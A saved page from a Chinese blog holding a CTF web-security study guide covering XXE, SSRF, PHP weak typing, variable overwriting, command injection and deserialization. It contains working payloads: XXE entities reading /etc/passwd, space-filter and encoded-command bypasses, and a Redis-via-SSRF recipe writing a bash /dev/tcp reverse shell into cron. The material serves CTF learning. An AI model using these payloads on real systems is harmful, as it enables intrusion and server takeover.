@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>Web常见知识点总结 | baba童鞋的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="当然，对于me这种CTF中Loser，这个文章与其说是总结梳理，不如说是预习笔记（fuzhizhantieo(&#x2F;&#x2F;&#x2F;&#x2F;^&#x2F;&#x2F;&#x2F;&#x2F;)q）。不过我有认真总结一些东西，值得一看的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web常见知识点总结">
+<meta property="og:url" content="http://example.com/2021/04/15/zhishidian/index.html">
+<meta property="og:site_name" content="baba童鞋的博客">
+<meta property="og:description" content="当然，对于me这种CTF中Loser，这个文章与其说是总结梳理，不如说是预习笔记（fuzhizhantieo(&#x2F;&#x2F;&#x2F;&#x2F;^&#x2F;&#x2F;&#x2F;&#x2F;)q）。不过我有认真总结一些东西，值得一看的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/04/15/zhishidian/1.png">
+<meta property="og:image" content="http://example.com/2021/04/15/zhishidian/2.png">
+<meta property="og:image" content="http://example.com/2021/04/15/zhishidian/3.png">
+<meta property="og:image" content="http://example.com/2021/04/15/zhishidian/4.png">
+<meta property="article:published_time" content="2021-04-15T07:02:01.000Z">
+<meta property="article:modified_time" content="2021-04-15T07:15:53.809Z">
+<meta property="article:author" content="Jialu">
+<meta property="article:tag" content="ctf web 霸霸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/04/15/zhishidian/1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/ljl.jpg">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: true
+      }
+  </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/ljl.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">我的心血，快来cue</a></li>
+                        
+                            <li><a  href="/categories/xz">肖战和我</a></li>
+                        
+                            <li><a  href="/about/index">关于老公老婆的那些事~</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/ljl.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">我的心血，快来cue</a></li>
+                
+                    <li><a href="/categories/xz">肖战和我</a></li>
+                
+                    <li><a href="/about/index">关于老公老婆的那些事~</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-zhishidian" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/04/15/zhishidian/" class="article-date">
+      <time datetime="2021-04-15T07:02:01.000Z" itemprop="datePublished">2021-04-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Web常见知识点总结
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>当然，对于me这种CTF中Loser，这个文章与其说是总结梳理，不如说是<strong>预习笔记</strong>（fuzhizhantieo(<em>////^////</em>)q）。不过我有认真总结一些东西，值得一看的</p><p></p>
+<a id="more"></a>
+<h1>01 CTF Web介绍</h1>
+<p>CTF中的Web题型，就是给定一个Web网站，选手要根据题目所提示的信息，找到网站上的flag字符串。<br>
+做题的方法类似于渗透测试，但通常不会是一个完整的渗透测试，而是用到渗透测试中的某一个或某几个环节。可能涉及信息搜集、各类漏洞发现与利用、权限提升等等。<br>
+为了获取flag，可能需要拿到管理员权限，数据库权限，甚至获取网站所在服务器的权限。</p>
+<h2>一、所需知识</h2>
+<ul>
+<li>语言：PHP、Python、JavaScript...</li>
+<li>数据库：MySQL、MSSQL...</li>
+<li>服务器：Apache、Nginx...</li>
+<li>Web框架：ThinkPHP、Flask...</li>
+<li>语言特性：弱类型、截断...</li>
+<li>
+<a href="https://blog.csdn.net/csu_vc/article/details/78440021" target="_blank" rel="nofollow">函数特性</a>：is_numeric、strcmp、eregi...</li>
+</ul>
+<h3>1.HTTP抓包/改包</h3>
+<ul>
+<li>首先要知道<a href="https://blog.csdn.net/weichendahai/article/details/65447073" target="_blank" rel="nofollow">HTTP请求、响应流程</a>，详细了解可以参考《HTTP权威指南》。（很厚的一本书，大牛们爱用这本书装B，Web领域的“九阳真经”，把这本书啃下来就是张无忌了，可是大多数人包括我在内总想练速成的“葵花宝典”）</li>
+<li>浏览器插件（Firefox）：个人觉得 F12 + Hackbar就够了，而且最新的Firefox将 F12和Hackbar 集成到了一起，用起来很顺手。</li>
+<li>工具：burpsuite神器，工具是好但是小白用起来可能需要一些时间去专门学习和熟悉。 <a href="http://www.vuln.cn/8847" target="_blank" rel="nofollow">下载地址</a>、 <a href="http://open.freebuf.com/category/subtitle/page/4" target="_blank" rel="nofollow">FreeBuf教程</a>、 <a href="https://www.ichunqiu.com/course/63057" target="_blank" rel="nofollow">i春秋教程</a>
+</li>
+</ul>
+<h3>2.Web前端</h3>
+<ul>
+<li>HTML+CSS+JavaScript：前端三剑客，学这个很轻松，很容易在信安的路上越走越偏，然后变成前端开发者。</li>
+<li>编码：url编码、html编码、js编码，可以参考<a href="https://www.jianshu.com/p/201aa3458a97" target="_blank">这篇文章</a>。</li>
+<li>Cookie，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ" target="_blank" rel="nofollow">缓存</a>
+</li>
+<li>
+<a href="https://www.cnblogs.com/vajoy/p/4295825.html" target="_blank" rel="nofollow">跨域问题</a>，<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="nofollow">CSP策略</a>
+</li>
+</ul>
+<h3>3.Web后端</h3>
+<ul>
+<li>PHP：官方文档</li>
+<li>Python：廖雪峰Python教程、官方文档</li>
+<li>PHP框架：ThinkPHP、Yii</li>
+<li>Python框架：Flask、Tornado、Django</li>
+<li>Go框架：beego</li>
+<li>Session</li>
+</ul>
+<h3>4.数据库和服务器</h3>
+<ul>
+<li>了解常见数据库及区别：MySQL、Oracle、MongoDB</li>
+<li>数据库操作：基本语句、文件读取、写入、权限、dnslog</li>
+<li>服务器：配置主流服务器，Apache、Nginx</li>
+<li>缓存引擎：Redis、Memcached</li>
+</ul>
+<h3>5.Linux</h3>
+<ul>
+<li>shell</li>
+<li>Lua</li>
+<li>Docker</li>
+</ul>
+<h3>6.常见web漏洞</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS</td>
+<td>文件包含/上传</td>
+</tr>
+<tr>
+<td>SQL注入</td>
+<td>反序列化</td>
+</tr>
+<tr>
+<td>CSRF</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>目录遍历</td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>业务逻辑漏洞</td>
+</tr>
+<tr><td>XEE</td></tr>
+</tbody>
+</table>
+<h3>7.工具</h3>
+<ul>
+<li>sqlmap</li>
+<li>Burpsuite</li>
+<li>Hackbar</li>
+<li>Proxy SwitchyOmega（浏览器代理插件）</li>
+<li>AWVS （web漏洞扫描）</li>
+<li>Kali（黑客的专属系统）</li>
+</ul>
+<h2>二、题目类型</h2>
+<h3>1.筑基（入门题目）</h3>
+<ul>
+<li>查看页面源代码，flag在注释里</li>
+<li>查看HTTP请求/响应包，flag在cookie、响应头中</li>
+<li>备份文件（.bak，.swp，.swo）泄露</li>
+<li>根据提示修改请求头（User-Agent、X-Forwarded-For）</li>
+<li>JSFuck</li>
+</ul>
+<h4>(1)例子</h4>
+<p>HCTF2016 Web1：2099年的flag<br>
+根据提示：</p>
+<blockquote>
+<p>only ios99 can get flag(Maybe you can easily get the flag in 2099)</p>
+</blockquote>
+<p>猜测可能需要改造UA。<br>
+
+</p><p>将<code>User-Agent</code>修改为<code>Mozilla/5.0 (iPhone; CPU iPhone OS 99 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1</code>，这个需要对照Safari浏览器发出的UA进行修改。</p><br><img src="/2021/04/15/zhishidian/1.png"><p></p>
+<h4>(2)文件泄露总结</h4>
+<p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="nofollow">关于泄露的好文章</a></p>
+<ul>
+<li><p>备份文件：.index.php.swp、.index.php.swo、.index.php.bak、.index.php~</p></li>
+<li><p>源码压缩包：<a href="http://www.zip" target="_blank" rel="nofollow">www.zip</a>、root.zip、web.zip</p></li>
+<li><p>git / svn泄露：<br>
+git泄露：<a href="http://www.xxx.com/.git/config" target="_blank" rel="nofollow">www.xxx.com/.git/config</a>，之后使用工具<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="nofollow">GitHack</a>可以获取源码 <code>python GitHack.py URL/.git</code><br>
+svn泄露：<a href="http://www.xxx.com/.svn/entries" target="_blank" rel="nofollow">www.xxx.com/.svn/entries</a>，利用工具<a href="https://github.com/hoathemt/dvcs-ripper" target="_blank" rel="nofollow">dvcs-ripper</a>获取源码</p></li>
+<li><p>其它文件泄露：<br>
+.idea目录泄露:（使用了IntelliJ IDEA的工程，可泄露目录结构），详情可看<a href="http://webscan.360.cn/vul/view/vulid/3631" target="_blank" rel="nofollow">这里</a><br>
+.DS_Store：<a href="http://www.xxx.com/.ds_store" target="_blank" rel="nofollow">www.xxx.com/.ds_store</a>，工具<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="nofollow">ds_store_exp</a><br>
+.pyc文件:（python编译后的字节码文件）</p></li>
+</ul>
+<h4>(3)请求修改、重放</h4>
+<p>这里主要用好Burpsuite、浏览器F12就够了，Firefox上的Hackbar也很方便，工具再多也没用。</p>
+<h4>(4)JSFuck</h4>
+<p>经过JSFuck编码后的JavaScript代码，要查看其运行结果非常简单，直接在页面中进行调用即可，或者在Chrome浏览器的开发者工具中的Console中执行即可。</p>
+<h3>2.结丹(常规题目)</h3>
+<ul>
+<li>一个存在漏洞的网站</li>
+<li>拿到数据库上的flag（SQL注入）</li>
+<li>拿到服务器上的flag（命令执行、文件上传）</li>
+<li>拿到管理员的cookie，flag在cookie里（XXE）</li>
+<li>其它的一些漏洞利用（条件竞争、SSRF、XXE）</li>
+</ul>
+<h4>(1)SQL注入</h4>
+<p>实验吧：<br>
+<a href="http://www.shiyanbar.com/ctf/1875" target="_blank" rel="nofollow">简单的sql注入</a><br>
+<a href="http://www.shiyanbar.com/ctf/1908" target="_blank" rel="nofollow">简单的sql注入2</a><br>
+<a href="http://www.shiyanbar.com/ctf/1909" target="_blank" rel="nofollow">简单的sql注入3</a></p>
+<h4>(2)XXE</h4>
+<p>后端获取一个xml文档</p>
+<pre><code>&lt;? php
+$xml=simplexml_load_string($_GET['xml']);
+print_r((string)$xml);
+</code></pre>
+<p>读取本地文件</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;file;&lt;/root&gt;
+</code></pre>
+<p>SSRF</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY url SYSTEM "http://zzm.cat:8080"&gt;]&gt;
+&lt;root&gt;&amp;url;&lt;/root&gt;
+</code></pre>
+<p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="nofollow">XEE练习</a> + <a href="https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/#api%E8%B0%83%E7%94%A8" target="_blank" rel="nofollow">Writeup</a></p>
+<h3>3.元婴(困难题目)</h3>
+<ul>
+<li>漏洞综合利用（e.g. 注入+SSRF+反序列化）</li>
+<li>少见的姿势（e.g. 字符命令执行）</li>
+<li>少见的语言（Ruby、Perl）</li>
+</ul>
+<h4>例子：</h4>
+<p>HITCON2017:<br>
+<a href="http://117.50.3.97:8001/" target="_blank" rel="nofollow">babyfirst-revenge</a><br>
+<a href="http://117.50.3.97:8002/" target="_blank" rel="nofollow">babyfirst-revenge-v2</a></p>
+<h1>02 CTF Web技巧</h1>
+<h2>一、PHP弱类型</h2>
+<h3>弱等于号 " == "</h3>
+<pre><code>false==""==0==NULL //true
+"admin1"==0 //true
+"1admin"==1 //true
+"0e123456"=="0e4456789" //true
+"0x1e240"=="123456" //true
+0=="0e4456789" //true
+[false]==[0] //true
+"0x1e240"=="123456"==123456 //true
+</code></pre>
+<h3>例题</h3>
+<pre><code>&lt;?php 
+$flag = "xxxx";
+if ($_GET['a'] != $_GET['b'] &amp;&amp; md5($_GET['a']) == md5($_GET['b']))
+&#123;
+  echo "Flag: ".$flag;
+&#125;
+</code></pre>
+<p>可以看一下这篇<a href="http://www.freebuf.com/news/67007.html" target="_blank" rel="nofollow">文章</a>，从中可以得知所有"0e"加纯数字的字符串均相互弱等于，及提交<code>a=s878926199a</code>和<code>b=s155964671a</code>即可</p>
+<pre><code>md5("s878926199a") =&gt;
+  "0e545993274517709034328855841020"
+md5("s155964671a") =&gt;
+  "0e342768416822451524974117254469"
+</code></pre>
+<h3>二、PHP函数</h3>
+<h4>类型转换</h4>
+<pre><code>md5(['a'])===md5(['b']) //对数组MD5会返回NULL
+strcmp([], 'a')===NULL //PHP&gt;5.3版本数组和字符串比较返回NULL
+in_array('abc', [0])===true //'abc'会被强制类型转换
+is_numeric('0e1')===true //科学计数法
+in_array('abc', [0,1,2])===true //比较时会使用若等于（'abc'==0）
+</code></pre>
+<h4>正则表达式（ereg/eregi）</h4>
+<ol>
+<li>字符串对比解析，当ereg读取字符串string时，%00后面的字符串不会被解析。<br>
+这里 <code>a=abcd%001234</code>，可绕过</li>
+</ol>
+<pre><code>&lt;?php
+if (ereg("^[a-zA-Z]+$", $_GET['a']) === FALSE) &#123;
+  echo 'You password must be alphabet';
+&#125;
+?&gt;
+</code></pre>
+<ol start="2">
+<li>如果传入数组，ereg返回NULL</li>
+</ol>
+<h3>三、变量覆盖</h3>
+<h4>extract()</h4>
+<p>extract()函数从数组中把变量导入到当前的符号表中。<br>
+对于数组中的每个元素，键名用于变量名，键值用于变量值。<br>
+例如传入auth=1，则会打印出"private!"</p>
+<pre><code>&lt;?php
+  $auth='0';
+  // 这里可以覆盖变量$auth的变量值
+  extract($_GET);
+  if($auth == 1)&#123;
+    echo "private!";
+  &#125; else&#123;
+    echo "public!";
+  &#125;
+?&gt;
+</code></pre>
+<h4>parse_str()</h4>
+<p>parse_str()的作用是解析字符串，并注册成变量。与parse_str()类似的函数还有 mb_parse_str()，parse_str() 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串(query string)，则将它解析为变量并设置到当前作用域。</p>
+<pre><code>&lt;?php
+  //var.php?var=new
+  $var='init';
+  parse_str($_SERVER['QUERY_STRING']);
+  // $var 会变成 new
+  echo $var;
+?&gt;
+</code></pre>
+<h4>$$</h4>
+<p>$$会把变量本身的 key 当做名字，value 当做变量值</p>
+<pre><code>&lt;?php
+  $_CONFIG['extraSecure'] = true;
+
+<p>  // <a target="_blank" rel="noopener" href="http://127.0.0.1/index.php?_CONFIG=123">http://127.0.0.1/index.php?_CONFIG=123</a><br>  foreach(array(‘_GET’, ‘_POST’) as $method) &#123;<br>    foreach($$method as $key=&gt;$value) &#123;<br>      // $key == _CONFIG<br>      // $$key == $_CONFIG<br>      // 这个函数会把 $_CONFIG 变量销毁<br>      unset($$key);<br>    &#125;<br>  &#125;<br>  if ($_CONFIG[‘extraSecure’] == false)&#123;<br>    echo ‘flag&#123;****&#125;’;<br>  &#125;<br>?&gt;<br></p></code></pre><p></p>
+<h4>练习</h4>
+<p>实验吧 <a href="http://ctf5.shiyanbar.com/10/web1/" target="_blank" rel="nofollow">天网管理系统</a></p>
+<h3>四、命令执行</h3>
+<h4>PHP中执行系统命令的函数</h4>
+<pre><code>system:     system("whoami");
+eval:       eval("phpinfo();");
+assert:     assert("phpinfo()");
+exec:       echo exec("whoami");
+passthru:   passthru("whoami");
+shell_exec: echo shell_exec("whoami");
+</code></pre>
+<h4>Bypass空格过滤</h4>
+<p>&lt;符号<br>
+<code>cat&lt;flag</code><br>
+$IFS符号<br>
+<code>cat$&#123;IFS&#125;flag</code><br>
+<code>cat$IFS"flag"</code><br>
+制表符<br>
+<code>cat flag</code></p>
+<h4>命令分隔符</h4>
+<p>| 符号</p>
+<pre><code>amber@MAC:~/$    echo 1|echo 2
+2
+</code></pre>
+<p>; 符号</p>
+<pre><code>amber@MAC:~/$    echo 1;echo 2
+1
+2
+</code></pre>
+<p>&amp;&amp;符号</p>
+<pre><code>amber@MAC:~/$    echo 1 &amp;&amp; echo 2
+1
+2
+</code></pre>
+<h4>利用$()，``执行命令</h4>
+<p>$()，``会将字符串当做命令执行，并返回结果</p>
+<pre><code>amber@MAC:~/$    echo $(whoami)
+amber
+</code></pre>
+<pre><code>amber@MAC:~/$    echo `whoami`
+amber
+</code></pre>
+<p>结合printf使用，可以绕过一些限制</p>
+<pre><code>amber@MAC:~/$    $(printf$IFS"\167\150\141\155\151")
+amber
+</code></pre>
+<pre><code>amber@MAC:~/$    $(printf$IFS"\x77\x68\x6f\x6d\x69")
+amber
+</code></pre>
+<h4>练习</h4>
+<p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="nofollow">http://web.jarvisoj.com:32798/</a></p>
+<h3>五、SSRF技巧</h3>
+<h4>SSRF介绍</h4>
+<p>服务器获取用户传入的url，并访问，如果不加过滤，可能导致内网探测、文件读取、攻击内网服务等</p>
+<pre><code>&lt;?php
+  // e.g. url=http://10.10.10.1
+  // e.g. url=file://etc/passwd
+  // e.g. url=dict://127.0.0.1:80
+  $ch = curl_init($_GET['url']);
+  echo curl_exec($ch);
+  curl_close($ch);
+?&gt;
+</code></pre>
+<p>常出现在离线下载，站长工具，远程头像上传等功能中</p>
+<h4>SSRF攻击</h4>
+<p>SSRF文件读取，内网探测</p>
+<pre><code>file:///etc/passwd
+dict://127.0.0.1:3306
+</code></pre>
+<p>SSRF攻击内网服务（redis为例）<br>
+修改dbfilename，将反弹shell的命令写入定时任务</p>
+<pre><code>set 1 "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ 127.0.0.1/2333 0&gt;&amp;1\n\n"
+config set dir /var/spool/cron
+config set dbfilename root
+save
+</code></pre>
+<h4>SSRF防御</h4>
+<p>过滤传入url的host（有没有问题？）</p>
+<pre><code>&lt;?php
+    function isLocal($ip)&#123;
+        $long=ip2long($ip);
+        $data=array(24=&gt;'10.255.255.255',20=&gt;'172.31.255.255',16=&gt;'192.168.255.255');
+        foreach ($data as $k =&gt; $v) &#123;
+            if ($long &gt;&gt; $k === ip2long($v)&gt;&gt;$k) &#123;
+                return true;
+            &#125;
+        &#125;
+    &#125;
+    $url = $_GET['url'];
+    $host = parse_url($url)['host'];
+    if (isLocal(gethostbyname($host))) die();
+    $ch = curl_init($url);
+    echo curl_exec($ch);
+    cuel_close($ch);
+?&gt;
+</code></pre>
+<p>parse_url和curl解析差异</p>
+
+<p><img src="/2021/04/15/zhishidian/2.png"></p>
+<p>IP双重绑定：如果同一个域名绑定了两个IP，那么PHP中的gethostname会随机返回一个。<br>
+但是curl在访问这种域名的时候，由于绑定的是两个IP，curl会尝试访问每一个IP，最终返回有效的那个</p>
+<h3>六、反序列化</h3>
+<h4>介绍</h4>
+
+<p><img src="/2021/04/15/zhishidian/3.png"></p>
+<h4>数组序列化</h4>
+<p>原数组：<code>['a'=&gt;'str', 'b'=&gt;1, 'c'=&gt;false]</code><br>
+序列化后：<code>a:3:&#123;s:1:"a";s:3:"str";s:1:"b";i:1;s:1:"b";i:1;s:1:"c";b:0;&#125;</code></p>
+<h4>对象序列化</h4>
+
+<p><img src="/2021/04/15/zhishidian/4.png"></p>
+<p>对于PHP中的类C，属性<code>data="abc"</code>会被序列化为不同的形式（%00代表空字符）<br>
+Public属性：<code>s:4:"data";s:3:"abc"</code><br>
+Private属性：<code>s:7"%00C%00data";s:3:"abc"</code><br>
+Protected属性：<code>s:7"%00*%00data";s:3:"abc"</code></p>
+<h4>其它数据类型</h4>
+<p>String（字符串）：s<br>
+Integer（整型）：i<br>
+Bool（Bool型）：b<br>
+NULL：N<br>
+Array（数组）：a<br>
+Object（对象）：o</p>
+<h4>魔术方法</h4>
+<p>__construct方法在对象诞生时调用，一般用来为成员属性赋初值</p>
+<pre><code>function __construct($name="amy", $sex="male", $age=20)
+&#123;
+  $this-&gt;name=$name;
+  $this-&gt;sex=$sex;
+  $this-&gt;age=$age;
+&#125;
+</code></pre>
+<p>__destruct方法在对象销毁时调用</p>
+<pre><code>class C&#123;
+  public function __destruct() &#123;
+    echo "The object is destructed.";
+  &#125;
+&#125;
+</code></pre>
+<p>__toString方法在打印对象时调用</p>
+<pre><code>class C&#123;
+  public function __toString()
+  &#123;
+    return "This is C";
+  &#125;
+&#125;
+</code></pre>
+<p>__sleep方法在对象序列化时调用</p>
+<pre><code>class C&#123;
+  public function __sleep() &#123;
+    echo "serialized";
+  &#125;
+&#125;
+$c = new C;
+serialize($c);
+</code></pre>
+<p>__wakeup方法在对象反序列化时调用</p>
+<pre><code>class C&#123;
+  public function __wakeup() &#123;
+    echo "unserialized";
+  &#125;
+&#125;
+unserialize('0:1:"c":0:&#123;&#125;');
+</code></pre>
+<p>__call方法在试图调用一个无法访问（不存在、无权限）的方法时调用</p>
+<pre><code>class C&#123;
+  public function __call($name, $arguments) &#123;
+    echo "called";
+  &#125;
+&#125;
+$c = new C;
+$c-&gt;a();
+</code></pre>
+<h4>PHP中可以利用的内置类</h4>
+<p>SoapClient(__call方法调用时导致SSRF)</p>
+<pre><code>$a = new SoapClient(null,array('uri'=&gt;'http://xxx.cat8080',
+'location'=&gt;'http://xxx.cat:8080'));
+$b = serialize($a);
+$c = unserialize($b);
+$c-&gt;a();
+</code></pre>
+<p>Directorylterator(__construct方法调用时导致列目录)</p>
+<pre><code>$c = new DirectoryIterator(".");
+foreach($c as $cc) &#123;
+  echo $cc,"&lt;/br&gt;";
+&#125;
+</code></pre>
+<h4>练习</h4>
+<p><a href="http://web.jarvisoj.com:32784/" target="_blank" rel="nofollow">http://web.jarvisoj.com:32784/</a><br>
+<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="nofollow">Writeup</a></p>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2021/04/15/zhishidian/">Web常见知识点总结</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2021年04月15日 - 15时02分</p>
+        <p><span>最后更新:</span>2021年04月15日 - 15时15分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/04/15/zhishidian/" title="Web常见知识点总结">http://example.com/2021/04/15/zhishidian/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/04/15/zhishidian/　　作者: " title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2021/04/15/tuzi/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界练习</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
